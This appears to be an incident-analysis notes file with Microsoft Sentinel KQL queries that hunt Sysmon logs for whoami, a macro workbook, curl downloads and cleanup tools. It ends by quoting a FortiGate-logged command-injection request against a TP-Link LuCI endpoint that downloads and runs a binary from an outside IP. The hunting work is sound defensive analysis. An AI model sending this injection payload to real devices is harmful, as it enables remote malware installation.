# Queries and Command Artifacts

## Sentinel Query

```kql
Sysmon
| where CommandLine contains "whoami"
```

This query searches Sysmon process telemetry for command lines containing `whoami`. The command is not malicious by itself; it becomes meaningful when correlated with the parent process, user, timing, and surrounding activity.

## Sentinel Process Field Review

```kql
Sysmon
| where CommandLine contains "whoami"
| project
    TimeGenerated,
    EventID,
    Computer,
    User,
    Image,
    CommandLine,
    ProcessId,
    ParentImage,
    ParentCommandLine,
    ParentProcessId
| order by TimeGenerated asc
```

This version keeps the investigation focused on the log fields that matter most for process analysis: process image, command line, parent process, parent command line, process ID, parent process ID, user, endpoint, and timestamp.

## Sentinel Timeline Expansion

```kql
Sysmon
| where User contains "Jim"
   or CommandLine has_any ("Gift.xlsm", "whoami", "curl", "ping", "cleanmgr", "CCleaner", "OneDriveSetup.exe", "cmd.xex")
   or ParentCommandLine has "Gift.xlsm"
| project
    TimeGenerated,
    EventID,
    Computer,
    User,
    Image,
    CommandLine,
    ParentImage,
    ParentCommandLine,
    ProcessId,
    ParentProcessId
| order by TimeGenerated asc
```

This expanded query is used to move from a single discovery command to the surrounding endpoint story: Excel opening `Gift.xlsm`, `curl` downloads, domain-controller ping checks, cleanup utilities, and related command-line activity.

## FortiGate Request Command Chain

```text
/cgi-bin/luci/;stok\=/locale?form\=country&operation\=write&country\=$(id>`cd+/tmp;+rm+-rf+shk;+wget+http://103.14.226.142/shk;+chmod+777+shk;+./shk+tplink;+rm+-rf+shk`)
```

The request attempts to run `id`, change into `/tmp`, download `shk`, make it executable, execute it with a `tplink` argument, and remove it afterward.
